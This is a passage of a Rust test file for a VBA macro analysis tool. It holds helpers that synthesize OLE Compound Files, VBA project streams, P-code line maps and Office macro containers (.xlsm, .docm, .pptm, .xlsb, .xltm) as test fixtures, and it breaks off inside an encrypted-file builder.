use std::fs;
use std::process::Command;
use vba_insight::export::{
    Disclosure, inspect_to_json, inspect_to_markdown, inspection_to_sarif, stomping_to_sarif,
};
use vba_insight::extract::extract_macro_container;
use vba_insight::host::HostProfile;
use vba_insight::stomping::{StompingFindingKind, StompingSeverity};
use vba_insight::{AnalysisOptions, Limits, inspect_macro_file};

/// CRC32 helper following IEEE 802.3 polynomial.
fn crc32(data: &[u8]) -> u32 {
    let mut crc = 0xffff_ffffu32;
    for &byte in data {
        crc ^= byte as u32;
        for _ in 0..8 {
            crc = if crc & 1 != 0 {
                (crc >> 1) ^ 0xedb8_8320
            } else {
                crc >> 1
            };
        }
    }
    !crc
}

/// Helper to compress data according to MS-OVBA Section 2.4.1.
fn comp_ovba(data: &[u8]) -> Vec<u8> {
    let mut body = Vec::new();
    for chunk in data.chunks(8) {
        body.push(0); // raw uncompressed flags byte
        body.extend_from_slice(chunk);
    }
    let total = body.len() + 2;
    let h = 0xb000u16 | ((total - 3) as u16);
    let mut out = vec![1]; // signature byte
    out.extend_from_slice(&h.to_le_bytes());
    out.extend_from_slice(&body);
    out
}

fn put16(b: &mut [u8], i: usize, v: u16) {
    b[i..i + 2].copy_from_slice(&v.to_le_bytes());
}

fn put32(b: &mut [u8], i: usize, v: u32) {
    b[i..i + 4].copy_from_slice(&v.to_le_bytes());
}

#[allow(clippy::too_many_arguments)]
fn put_cfb_entry(
    buf: &mut [u8],
    id: usize,
    name: &str,
    kind: u8,
    left: u32,
    right: u32,
    child: u32,
    start: u32,
    size: u64,
) {
    let off = id * 128;
    for (i, u) in name.encode_utf16().chain(std::iter::once(0)).enumerate() {
        buf[off + i * 2..off + i * 2 + 2].copy_from_slice(&u.to_le_bytes());
    }
    put16(
        buf,
        off + 64,
        ((name.encode_utf16().count() + 1) * 2) as u16,
    );
    buf[off + 66] = kind;
    put32(buf, off + 68, left);
    put32(buf, off + 72, right);
    put32(buf, off + 76, child);
    put32(buf, off + 116, start);
    buf[off + 120..off + 128].copy_from_slice(&size.to_le_bytes());
}

fn record_dir(id: u16, payload: &[u8], out: &mut Vec<u8>) {
    out.extend_from_slice(&id.to_le_bytes());
    out.extend_from_slice(&(payload.len() as u32).to_le_bytes());
    out.extend_from_slice(payload);
}

/// Allocate a mini-stream into the mini buffer and wire up its MiniFAT chain.
fn allocate_mini_stream(data: &[u8], mini: &mut Vec<u8>, minifat: &mut [u32]) -> (u32, u64) {
    if data.is_empty() {
        return (0xffff_fffe, 0);
    }
    let start_sector = (mini.len() / 64) as u32;
    let num_sectors = data.len().div_ceil(64);
    for i in 0..num_sectors {
        let sec = start_sector + i as u32;
        if i + 1 < num_sectors {
            minifat[sec as usize] = sec + 1;
        } else {
            minifat[sec as usize] = 0xffff_fffe; // ENDOFCHAIN
        }
    }
    mini.extend_from_slice(data);
    let rem = mini.len() % 64;
    if rem != 0 {
        mini.resize(mini.len() + (64 - rem), 0);
    }
    (start_sector, data.len() as u64)
}

/// Synthesize a realistic CFB (OLE Compound File) containing one or more modules in a VBA Project.
fn synthesize_cfb_project(
    proj_name: &str,
    modules: &[(&str, &str, &[u8])],
    identifiers: &[&str],
) -> Vec<u8> {
    synthesize_cfb_project_with_manifest(proj_name, modules, identifiers, None)
}

/// Synthesize a realistic CFB with optional custom PROJECT stream manifest.
fn synthesize_cfb_project_with_manifest(
    proj_name: &str,
    modules: &[(&str, &str, &[u8])],
    identifiers: &[&str],
    manifest_override: Option<&str>,
) -> Vec<u8> {
    let mut raw_modules = Vec::new();
    for &(name, src, pcode) in modules {
        let mut mod_bytes = pcode.to_vec();
        mod_bytes.extend_from_slice(&comp_ovba(src.as_bytes()));
        raw_modules.push((name, mod_bytes, pcode.len() as u32));
    }
    let slice: Vec<(&str, Option<&[u8]>, u32)> = raw_modules
        .iter()
        .map(|(n, b, off)| (*n, Some(b.as_slice()), *off))
        .collect();
    synthesize_cfb_raw_project_with_manifest(proj_name, &slice, identifiers, manifest_override)
}

/// Synthesize a realistic CFB allowing raw module stream contents, custom text offsets, and optional ghost modules.
/// Modules is a slice of: (module_name, raw_stream_bytes: Option<&[u8]>, text_offset: u32)
fn synthesize_cfb_raw_project_with_manifest(
    proj_name: &str,
    modules: &[(&str, Option<&[u8]>, u32)],
    identifiers: &[&str],
    manifest_override: Option<&str>,
) -> Vec<u8> {
    assert!(
        modules.len() <= 3,
        "test synthesizer supports up to 3 modules in 2 directory sectors"
    );

    let mut dir_raw = Vec::new();
    record_dir(0x0001, &1u32.to_le_bytes(), &mut dir_raw); // SYSKIND = Win32
    record_dir(0x0002, &0x0409u32.to_le_bytes(), &mut dir_raw); // LCID
    record_dir(0x0014, &0x0409u32.to_le_bytes(), &mut dir_raw);
    record_dir(0x0003, &1252u16.to_le_bytes(), &mut dir_raw); // CodePage CP1252
    record_dir(0x0004, proj_name.as_bytes(), &mut dir_raw); // ProjectName
    dir_raw.extend_from_slice(&0x0005u16.to_le_bytes());
    dir_raw.extend_from_slice(&0u32.to_le_bytes());
    dir_raw.extend_from_slice(&0x0040u16.to_le_bytes());
    dir_raw.extend_from_slice(&0u32.to_le_bytes());
    dir_raw.extend_from_slice(&0x0006u16.to_le_bytes());
    dir_raw.extend_from_slice(&0u32.to_le_bytes());
    dir_raw.extend_from_slice(&0x003du16.to_le_bytes());
    dir_raw.extend_from_slice(&0u32.to_le_bytes());
    record_dir(0x0007, &0u32.to_le_bytes(), &mut dir_raw);
    record_dir(0x0008, &0u32.to_le_bytes(), &mut dir_raw);
    dir_raw.extend_from_slice(&0x0009u16.to_le_bytes());
    dir_raw.extend_from_slice(&4u32.to_le_bytes());
    dir_raw.extend_from_slice(&0x0097u32.to_le_bytes());
    dir_raw.extend_from_slice(&1u16.to_le_bytes());

    // PROJECTMODULES header
    dir_raw.extend_from_slice(&0x000fu16.to_le_bytes());
    dir_raw.extend_from_slice(&2u32.to_le_bytes());
    dir_raw.extend_from_slice(&(modules.len() as u16).to_le_bytes());
    dir_raw.extend_from_slice(&0x0013u16.to_le_bytes());
    dir_raw.extend_from_slice(&2u32.to_le_bytes());
    dir_raw.extend_from_slice(&0xffffu16.to_le_bytes()); // cookie

    for &(mod_name, _, text_offset) in modules {
        record_dir(0x0019, mod_name.as_bytes(), &mut dir_raw);
        let name16 = mod_name
            .encode_utf16()
            .flat_map(u16::to_le_bytes)
            .collect::<Vec<_>>();
        record_dir(0x0047, &name16, &mut dir_raw);
        record_dir(0x001a, mod_name.as_bytes(), &mut dir_raw);
        dir_raw.extend_from_slice(&0x0032u16.to_le_bytes());
        dir_raw.extend_from_slice(&(name16.len() as u32).to_le_bytes());
        dir_raw.extend_from_slice(&name16);
        record_dir(0x001c, b"", &mut dir_raw);
        dir_raw.extend_from_slice(&0x0048u16.to_le_bytes());
        dir_raw.extend_from_slice(&0u32.to_le_bytes());

        // Text offset record (0x0031)
        record_dir(0x0031, &text_offset.to_le_bytes(), &mut dir_raw);
        record_dir(0x001e, &0u32.to_le_bytes(), &mut dir_raw);
        record_dir(0x002c, &0xffffu16.to_le_bytes(), &mut dir_raw);
        record_dir(0x0021, &0u32.to_le_bytes(), &mut dir_raw);
        dir_raw.extend_from_slice(&0x002bu16.to_le_bytes());
        dir_raw.extend_from_slice(&0u32.to_le_bytes());
    }

    let dir_comp = comp_ovba(&dir_raw);
    let project_stream = if let Some(custom) = manifest_override {
        custom.as_bytes().to_vec()
    } else {
        let mut project_str = format!("Name={proj_name}\r\n");
        for &(mod_name, _, _) in modules {
            project_str.push_str(&format!("Module={mod_name}\r\n"));
        }
        project_str.into_bytes()
    };

    // Build _VBA_PROJECT stream with magic 0x61CC
    let mut vba_project_stream = Vec::new();
    vba_project_stream.extend_from_slice(&0x61CCu16.to_le_bytes());
    vba_project_stream.extend_from_slice(&0x0097u16.to_le_bytes()); // VBA7
    vba_project_stream.extend_from_slice(&0x0000u16.to_le_bytes());
    vba_project_stream.resize(0x1E, 0);
    vba_project_stream.extend_from_slice(&0u16.to_le_bytes()); // numRefs
    vba_project_stream.extend_from_slice(&0u16.to_le_bytes());
    vba_project_stream.extend_from_slice(&0u16.to_le_bytes()); // class table
    vba_project_stream.extend_from_slice(&0u16.to_le_bytes()); // compile pairs
    vba_project_stream.extend_from_slice(&0u16.to_le_bytes());
    vba_project_stream.extend_from_slice(&0u16.to_le_bytes()); // typeinfo
    vba_project_stream.extend_from_slice(&0u16.to_le_bytes()); // desc
    vba_project_stream.extend_from_slice(&0u16.to_le_bytes()); // help
    vba_project_stream.resize(vba_project_stream.len() + 0x64, 0);
    vba_project_stream.extend_from_slice(&0u16.to_le_bytes()); // numProjects = 0
    vba_project_stream.extend_from_slice(&[0; 6]);
    vba_project_stream.extend_from_slice(&0u32.to_le_bytes()); // table before IDs
    vba_project_stream.extend_from_slice(&[0; 6]);

    let num_ids = identifiers.len() as u16;
    vba_project_stream.extend_from_slice(&num_ids.to_le_bytes()); // w0
    vba_project_stream.extend_from_slice(&num_ids.to_le_bytes()); // num_total_ids
    vba_project_stream.extend_from_slice(&0u16.to_le_bytes()); // w1
    vba_project_stream.extend_from_slice(&[0; 4]);

    for id in identifiers {
        vba_project_stream.push(0);
        vba_project_stream.push(id.len() as u8);
        vba_project_stream.extend_from_slice(id.as_bytes());
        vba_project_stream.extend_from_slice(&[0; 4]);
    }

    // Build mini-stream and MiniFAT dynamically
    let mut mini = Vec::new();
    let mut minifat = vec![0xffff_ffffu32; 256];

    let (dir_start, dir_size) = allocate_mini_stream(&dir_comp, &mut mini, &mut minifat);
    let (proj_start, proj_size) = allocate_mini_stream(&project_stream, &mut mini, &mut minifat);
    let (vba_start, vba_size) = allocate_mini_stream(&vba_project_stream, &mut mini, &mut minifat);

    let mut mod_allocs = Vec::new();
    for &(mod_name, maybe_bytes, _) in modules {
        if let Some(mod_bytes) = maybe_bytes {
            let (start, sz) = allocate_mini_stream(mod_bytes, &mut mini, &mut minifat);
            mod_allocs.push((mod_name, start, sz));
        }
    }

    let mini_sectors_512 = mini.len().div_ceil(512);
    mini.resize(mini_sectors_512 * 512, 0);

    let mut dir_entries = vec![0u8; 1024];
    put_cfb_entry(
        &mut dir_entries,
        0,
        "Root Entry",
        5,
        0xffff_ffff,
        0xffff_ffff,
        1,
        4,
        mini.len() as u64,
    );
    put_cfb_entry(
        &mut dir_entries,
        1,
        "PROJECT",
        2,
        0xffff_ffff,
        2,
        0xffff_ffff,
        proj_start,
        proj_size,
    );
    put_cfb_entry(
        &mut dir_entries,
        2,
        "VBA",
        1,
        0xffff_ffff,
        0xffff_ffff,
        3,
        0xffff_ffff,
        0,
    );
    put_cfb_entry(
        &mut dir_entries,
        3,
        "dir",
        2,
        0xffff_ffff,
        4,
        0xffff_ffff,
        dir_start,
        dir_size,
    );
    put_cfb_entry(
        &mut dir_entries,
        4,
        "_VBA_PROJECT",
        2,
        0xffff_ffff,
        if mod_allocs.is_empty() {
            0xffff_ffff
        } else {
            5
        },
        0xffff_ffff,
        vba_start,
        vba_size,
    );

    for (i, &(mod_name, m_start, m_sz)) in mod_allocs.iter().enumerate() {
        let entry_id = 5 + i;
        let right = if i + 1 < mod_allocs.len() {
            (5 + i + 1) as u32
        } else {
            0xffff_ffff
        };
        put_cfb_entry(
            &mut dir_entries,
            entry_id,
            mod_name,
            2,
            0xffff_ffff,
            right,
            0xffff_ffff,
            m_start,
            m_sz,
        );
    }

    let total_file_sectors = 4 + mini_sectors_512;
    let mut file = vec![0u8; 512 + total_file_sectors * 512];
    file[..8].copy_from_slice(&[0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1]);
    put16(&mut file, 24, 0x003e);
    put16(&mut file, 26, 3);
    put16(&mut file, 28, 0xfffe);
    put16(&mut file, 30, 9); // sector size 512 (2^9)
    put16(&mut file, 32, 6); // mini sector size 64 (2^6)
    put32(&mut file, 44, 1); // num FAT sectors
    put32(&mut file, 48, 1); // first dir sector = 1
    put32(&mut file, 56, 4096); // mini stream cutoff = 4096
    put32(&mut file, 60, 3); // first MiniFAT sector = 3
    put32(&mut file, 64, 1); // num MiniFAT sectors = 1
    put32(&mut file, 68, 0xffff_fffe); // first DIFAT
    put32(&mut file, 72, 0);
    put32(&mut file, 76, 0); // FAT sector 0 is at offset 512
    for i in 1..109 {
        put32(&mut file, 76 + i * 4, 0xffff_ffff);
    }

    // FAT sector (offset 512)
    let fat_offset = 512;
    put32(&mut file, fat_offset, 0xffff_fffd); // Sector 0 is FAT
    put32(&mut file, fat_offset + 4, 2); // Sector 1 -> 2 (Dir entries)
    put32(&mut file, fat_offset + 8, 0xffff_fffe); // Sector 2 = END (Dir entries)
    put32(&mut file, fat_offset + 12, 0xffff_fffe); // Sector 3 = END (MiniFAT)

    // Wire up mini stream sectors in FAT (sectors 4..)
    for i in 0..mini_sectors_512 {
        let sec = 4 + i;
        if i + 1 < mini_sectors_512 {
            put32(&mut file, fat_offset + sec * 4, (sec + 1) as u32);
        } else {
            put32(&mut file, fat_offset + sec * 4, 0xffff_fffe);
        }
    }
    for i in (4 + mini_sectors_512)..128 {
        put32(&mut file, fat_offset + i * 4, 0xffff_ffff);
    }

    // Directory sectors (sectors 1 & 2: offset 1024..2048)
    file[1024..1536].copy_from_slice(&dir_entries[..512]);
    file[1536..2048].copy_from_slice(&dir_entries[512..]);

    // MiniFAT sector (sector 3: offset 2048..2560)
    for (i, val) in minifat[..128].iter().enumerate() {
        put32(&mut file, 2048 + i * 4, *val);
    }

    // Mini stream content (sectors 4..: offset 2560..)
    file[2560..2560 + mini.len()].copy_from_slice(&mini);

    file
}

/// Backward-compatible single module CFB synthesizer.
fn synthesize_cfb(
    proj_name: &str,
    module_name: &str,
    source_code: &str,
    pcode_bytes: &[u8],
) -> Vec<u8> {
    synthesize_cfb_project(
        proj_name,
        &[(module_name, source_code, pcode_bytes)],
        &["CalculateTotal", "TaxRate"],
    )
}

/// Synthesize a valid CAFE P-code line map buffer from line instruction slices.
fn synthesize_pcode_line_map(lines: &[&[u8]]) -> Vec<u8> {
    let mut pcode = Vec::new();
    pcode.extend_from_slice(&0xCAFEu16.to_le_bytes()); // 0xCAFE
    pcode.extend_from_slice(&[0x00, 0x00]); // profile header
    pcode.extend_from_slice(&(lines.len() as u16).to_le_bytes()); // line count

    let mut rel_offset = 0u32;
    for line in lines {
        pcode.extend_from_slice(&[0u8; 4]); // prefix
        pcode.extend_from_slice(&(line.len() as u16).to_le_bytes()); // length
        pcode.extend_from_slice(&[0u8; 2]); // middle
        pcode.extend_from_slice(&rel_offset.to_le_bytes()); // relative offset
        rel_offset += line.len() as u32;
    }

    pcode.extend_from_slice(&[0u8; 10]); // padding before code table

    for line in lines {
        pcode.extend_from_slice(line);
    }

    pcode
}

/// Build a FuncDefn instruction targeting an identifier index.
fn build_func_defn(ident_idx: u16) -> Vec<u8> {
    let mut inst = Vec::new();
    inst.extend_from_slice(&150u16.to_le_bytes()); // FuncDefn
    let id_code = ((0x100 + 4 + ident_idx) << 1) as u32;
    inst.extend_from_slice(&id_code.to_le_bytes());
    inst
}

/// Build a LitStr instruction containing a string literal with proper padding.
fn build_lit_str(s: &str) -> Vec<u8> {
    let mut inst = Vec::new();
    inst.extend_from_slice(&182u16.to_le_bytes()); // 32-bit LitStr (translates to 185)
    inst.extend_from_slice(&(s.len() as u16).to_le_bytes());
    inst.extend_from_slice(s.as_bytes());
    if s.len() & 1 != 0 {
        inst.push(0); // 1 byte padding for odd lengths
    }
    inst
}

/// Build an ArgsCall instruction calling a procedure by identifier index.
fn build_args_call(ident_idx: u16, arg_count: u16) -> Vec<u8> {
    let mut inst = Vec::new();
    inst.extend_from_slice(&65u16.to_le_bytes()); // ArgsCall
    let id_code = (0x100 + 4 + ident_idx) << 1;
    inst.extend_from_slice(&id_code.to_le_bytes());
    inst.extend_from_slice(&arg_count.to_le_bytes());
    inst
}

/// Package entries into a valid standard ZIP archive.
fn synthesize_zip(entries: &[(&str, &[u8])]) -> Vec<u8> {
    let mut z = Vec::new();
    let mut records = Vec::new();
    for &(name, payload) in entries {
        let name_b = name.as_bytes();
        let crc = crc32(payload);
        let local_offset = z.len() as u32;
        z.extend_from_slice(&0x04034b50u32.to_le_bytes());
        z.extend_from_slice(&20u16.to_le_bytes());
        z.extend_from_slice(&0u16.to_le_bytes());
        z.extend_from_slice(&0u16.to_le_bytes());
        z.extend_from_slice(&[0; 4]);
        z.extend_from_slice(&crc.to_le_bytes());
        z.extend_from_slice(&(payload.len() as u32).to_le_bytes());
        z.extend_from_slice(&(payload.len() as u32).to_le_bytes());
        z.extend_from_slice(&(name_b.len() as u16).to_le_bytes());
        z.extend_from_slice(&0u16.to_le_bytes());
        z.extend_from_slice(name_b);
        z.extend_from_slice(payload);
        records.push((name_b, crc, payload.len() as u32, local_offset));
    }
    let cd = z.len();
    for (name_b, crc, size, local_offset) in &records {
        z.extend_from_slice(&0x02014b50u32.to_le_bytes());
        z.extend_from_slice(&[20, 0, 20, 0, 0, 0]);
        z.extend_from_slice(&0u16.to_le_bytes());
        z.extend_from_slice(&[0; 4]);
        z.extend_from_slice(&crc.to_le_bytes());
        z.extend_from_slice(&size.to_le_bytes());
        z.extend_from_slice(&size.to_le_bytes());
        z.extend_from_slice(&(name_b.len() as u16).to_le_bytes());
        z.extend_from_slice(&[0; 6]);
        z.extend_from_slice(&[0; 6]);
        z.extend_from_slice(&local_offset.to_le_bytes());
        z.extend_from_slice(name_b);
    }
    let cdsize = z.len() - cd;
    z.extend_from_slice(&0x06054b50u32.to_le_bytes());
    z.extend_from_slice(&[0; 4]);
    z.extend_from_slice(&(records.len() as u16).to_le_bytes());
    z.extend_from_slice(&(records.len() as u16).to_le_bytes());
    z.extend_from_slice(&(cdsize as u32).to_le_bytes());
    z.extend_from_slice(&(cd as u32).to_le_bytes());
    z.extend_from_slice(&0u16.to_le_bytes());
    z
}

/// Package CFB bytes into an OpenXML (.xlsm) ZIP container.
fn synthesize_xlsm(cfb_data: &[u8]) -> Vec<u8> {
    let content_types = "<Types xmlns=\"http://schemas.openxmlformats.org/package/2006/content-types\"><Default Extension=\"rels\" ContentType=\"application/vnd.openxmlformats-package.relationships+xml\"/><Default Extension=\"xml\" ContentType=\"application/xml\"/><Override PartName=\"/xl/workbook.xml\" ContentType=\"application/vnd.ms-excel.sheet.macroEnabled.main+xml\"/><Override PartName=\"/xl/vbaProject.bin\" ContentType=\"application/vnd.ms-office.vbaProject\"/></Types>";
    let pkg_rels = "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\"><Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument\" Target=\"xl/workbook.xml\"/></Relationships>";
    let wb = "<workbook xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\" xmlns:r=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships\"><workbookPr codeName=\"ThisWorkbook\"/><sheets><sheet name=\"Orders\" sheetId=\"1\" r:id=\"rId1\"/></sheets></workbook>";
    let wb_rels = "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\"><Relationship Id=\"rId1\" Type=\"http://schemas.microsoft.com/office/2006/relationships/vbaProject\" Target=\"vbaProject.bin\"/></Relationships>";

    synthesize_zip(&[
        ("[Content_Types].xml", content_types.as_bytes()),
        ("_rels/.rels", pkg_rels.as_bytes()),
        ("xl/workbook.xml", wb.as_bytes()),
        ("xl/_rels/workbook.xml.rels", wb_rels.as_bytes()),
        ("xl/vbaProject.bin", cfb_data),
    ])
}

/// Package CFB bytes and custom sheets into an OpenXML (.xlsm) ZIP container.
fn synthesize_xlsm_with_sheets(
    cfb_data: &[u8],
    sheets: &[(&str, &str, &str)], // (sheet_name, rel_type, sheet_xml)
) -> Vec<u8> {
    let mut content_types = String::from(
        "<Types xmlns=\"http://schemas.openxmlformats.org/package/2006/content-types\"><Default Extension=\"rels\" ContentType=\"application/vnd.openxmlformats-package.relationships+xml\"/><Default Extension=\"xml\" ContentType=\"application/xml\"/><Override PartName=\"/xl/workbook.xml\" ContentType=\"application/vnd.ms-excel.sheet.macroEnabled.main+xml\"/><Override PartName=\"/xl/vbaProject.bin\" ContentType=\"application/vnd.ms-office.vbaProject\"/>",
    );
    for (i, _) in sheets.iter().enumerate() {
        content_types.push_str(&format!(
            "<Override PartName=\"/xl/worksheets/sheet{}.xml\" ContentType=\"application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml\"/>",
            i + 1
        ));
    }
    content_types.push_str("</Types>");

    let pkg_rels = "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\"><Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument\" Target=\"xl/workbook.xml\"/></Relationships>";

    let mut wb = String::from(
        "<workbook xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\" xmlns:r=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships\"><workbookPr codeName=\"ThisWorkbook\"/><sheets>",
    );
    for (i, (name, _, _)) in sheets.iter().enumerate() {
        wb.push_str(&format!(
            "<sheet name=\"{}\" sheetId=\"{}\" r:id=\"rId{}\"/>",
            name,
            i + 1,
            i + 2
        ));
    }
    wb.push_str("</sheets></workbook>");

    let mut wb_rels = String::from(
        "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\"><Relationship Id=\"rId1\" Type=\"http://schemas.microsoft.com/office/2006/relationships/vbaProject\" Target=\"vbaProject.bin\"/>",
    );
    for (i, (_, rel_type, _)) in sheets.iter().enumerate() {
        wb_rels.push_str(&format!(
            "<Relationship Id=\"rId{}\" Type=\"{}\" Target=\"worksheets/sheet{}.xml\"/>",
            i + 2,
            rel_type,
            i + 1
        ));
    }
    wb_rels.push_str("</Relationships>");

    let mut zip_entries: Vec<(String, Vec<u8>)> = vec![
        (
            "[Content_Types].xml".to_string(),
            content_types.into_bytes(),
        ),
        ("_rels/.rels".to_string(), pkg_rels.as_bytes().to_vec()),
        ("xl/workbook.xml".to_string(), wb.into_bytes()),
        (
            "xl/_rels/workbook.xml.rels".to_string(),
            wb_rels.into_bytes(),
        ),
        ("xl/vbaProject.bin".to_string(), cfb_data.to_vec()),
    ];

    for (i, (_, _, sheet_xml)) in sheets.iter().enumerate() {
        zip_entries.push((
            format!("xl/worksheets/sheet{}.xml", i + 1),
            sheet_xml.as_bytes().to_vec(),
        ));
    }

    let refs: Vec<(&str, &[u8])> = zip_entries
        .iter()
        .map(|(k, v)| (k.as_str(), v.as_slice()))
        .collect();
    synthesize_zip(&refs)
}

/// Package CFB bytes into a Word (.docm) macro container.
fn synthesize_docm(cfb_data: &[u8]) -> Vec<u8> {
    let content_types = "<Types xmlns=\"http://schemas.openxmlformats.org/package/2006/content-types\"><Default Extension=\"rels\" ContentType=\"application/vnd.openxmlformats-package.relationships+xml\"/><Default Extension=\"xml\" ContentType=\"application/xml\"/><Override PartName=\"/word/document.xml\" ContentType=\"application/vnd.ms-word.document.macroEnabled.main+xml\"/><Override PartName=\"/word/vbaProject.bin\" ContentType=\"application/vnd.ms-office.vbaProject\"/></Types>";
    let pkg_rels = "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\"><Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument\" Target=\"word/document.xml\"/></Relationships>";
    let doc = "<w:document xmlns:w=\"http://schemas.openxmlformats.org/wordprocessingml/2006/main\"><w:body/></w:document>";
    let doc_rels = "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\"><Relationship Id=\"rId1\" Type=\"http://schemas.microsoft.com/office/2006/relationships/vbaProject\" Target=\"vbaProject.bin\"/></Relationships>";

    synthesize_zip(&[
        ("[Content_Types].xml", content_types.as_bytes()),
        ("_rels/.rels", pkg_rels.as_bytes()),
        ("word/document.xml", doc.as_bytes()),
        ("word/_rels/document.xml.rels", doc_rels.as_bytes()),
        ("word/vbaProject.bin", cfb_data),
    ])
}

/// Package CFB bytes into a PowerPoint (.pptm) macro container.
fn synthesize_pptm(cfb_data: &[u8]) -> Vec<u8> {
    let content_types = "<Types xmlns=\"http://schemas.openxmlformats.org/package/2006/content-types\"><Default Extension=\"rels\" ContentType=\"application/vnd.openxmlformats-package.relationships+xml\"/><Default Extension=\"xml\" ContentType=\"application/xml\"/><Override PartName=\"/ppt/presentation.xml\" ContentType=\"application/vnd.ms-powerpoint.presentation.macroEnabled.main+xml\"/><Override PartName=\"/ppt/vbaProject.bin\" ContentType=\"application/vnd.ms-office.vbaProject\"/></Types>";
    let pkg_rels = "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\"><Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument\" Target=\"ppt/presentation.xml\"/></Relationships>";
    let pres =
        "<p:presentation xmlns:p=\"http://schemas.openxmlformats.org/presentationml/2006/main\"/>";
    let pres_rels = "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\"><Relationship Id=\"rId1\" Type=\"http://schemas.microsoft.com/office/2006/relationships/vbaProject\" Target=\"vbaProject.bin\"/></Relationships>";

    synthesize_zip(&[
        ("[Content_Types].xml", content_types.as_bytes()),
        ("_rels/.rels", pkg_rels.as_bytes()),
        ("ppt/presentation.xml", pres.as_bytes()),
        ("ppt/_rels/presentation.xml.rels", pres_rels.as_bytes()),
        ("ppt/vbaProject.bin", cfb_data),
    ])
}

/// Package CFB bytes into an Excel Binary (.xlsb) macro container.
fn synthesize_xlsb(cfb_data: &[u8]) -> Vec<u8> {
    let content_types = "<Types xmlns=\"http://schemas.openxmlformats.org/package/2006/content-types\"><Default Extension=\"rels\" ContentType=\"application/vnd.openxmlformats-package.relationships+xml\"/><Default Extension=\"bin\" ContentType=\"application/vnd.ms-excel.sheet.binary.macroEnabled.main\"/><Override PartName=\"/xl/vbaProject.bin\" ContentType=\"application/vnd.ms-office.vbaProject\"/></Types>";
    let pkg_rels = "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\"><Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument\" Target=\"xl/workbook.bin\"/></Relationships>";
    let dummy_bin = b"\xD0\xCF\x11\xE0";
    let wb_rels = "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\"><Relationship Id=\"rId1\" Type=\"http://schemas.microsoft.com/office/2006/relationships/vbaProject\" Target=\"vbaProject.bin\"/></Relationships>";

    synthesize_zip(&[
        ("[Content_Types].xml", content_types.as_bytes()),
        ("_rels/.rels", pkg_rels.as_bytes()),
        ("xl/workbook.bin", dummy_bin),
        ("xl/_rels/workbook.bin.rels", wb_rels.as_bytes()),
        ("xl/vbaProject.bin", cfb_data),
    ])
}

/// Package CFB bytes into a stripped ZIP container without OPC XML metadata.
fn synthesize_stripped_zip(cfb_data: &[u8], entry_name: &str) -> Vec<u8> {
    synthesize_zip(&[(entry_name, cfb_data)])
}

/// Package CFB bytes into an Excel Template (.xltm) macro container.
fn synthesize_xltm(cfb_data: &[u8]) -> Vec<u8> {
    let content_types = "<Types xmlns=\"http://schemas.openxmlformats.org/package/2006/content-types\"><Default Extension=\"rels\" ContentType=\"application/vnd.openxmlformats-package.relationships+xml\"/><Default Extension=\"xml\" ContentType=\"application/xml\"/><Override PartName=\"/xl/workbook.xml\" ContentType=\"application/vnd.ms-excel.template.macroEnabled.main+xml\"/><Override PartName=\"/xl/vbaProject.bin\" ContentType=\"application/vnd.ms-office.vbaProject\"/></Types>";
    let pkg_rels = "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\"><Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument\" Target=\"xl/workbook.xml\"/></Relationships>";
    let wb = "<workbook xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\"><sheets><sheet name=\"TemplateSheet\" sheetId=\"1\" r:id=\"rId1\"/></sheets></workbook>";
    let wb_rels = "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\"><Relationship Id=\"rId1\" Type=\"http://schemas.microsoft.com/office/2006/relationships/vbaProject\" Target=\"vbaProject.bin\"/></Relationships>";

    synthesize_zip(&[
        ("[Content_Types].xml", content_types.as_bytes()),
        ("_rels/.rels", pkg_rels.as_bytes()),
        ("xl/workbook.xml", wb.as_bytes()),
        ("xl/_rels/workbook.xml.rels", wb_rels.as_bytes()),
        ("xl/vbaProject.bin", cfb_data),
    ])
}

/// Synthesize an encrypted OLE Compound File (password-protected Office package).
fn synthesize_encrypted_cfb() -> Vec<u8> {
    let mut cfb = vec![0u8; 512 * 4];
    cfb[0..8].copy_from_slice(&[0xD0, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1]);
    put16(&mut cfb, 26, 3);
    put16(&mut cfb, 28, 0xFFFE);
    put16(&mut cfb, 30, 9);
    put16(&mut cfb, 32, 6);
    put32(&mut cfb, 44, 1);
    put32(&mut cfb, 48, 1);
    put32(&mut cfb, 56, 4096);
    put32(&mut cfb, 60, 0xFFFFFFFE);
    put32(&mut cfb, 64, 0);
    put32(&mut cfb, 68, 0xFFFFFFFE);
    put32(&mut cfb, 72, 0);
    put32(&mut cfb, 76, 0);
    for i in 1..109 {
        put32(&mut cfb, 76 + i * 4, 0xFFFFFFFF);
    }

    let fat_off = 512;
    put32(&mut cfb, fat_off, 0xFFFFFFFD);
    put32(&mut cfb, fat_off + 4, 0xFFFFFFFE);
    put32(&mut cfb, fat_off + 8, 0xFFFFFFFE);
    for i in 3..128 {
        put32(&mut cfb, fat_off + i * 4, 0xFFFFFFFF);
    }

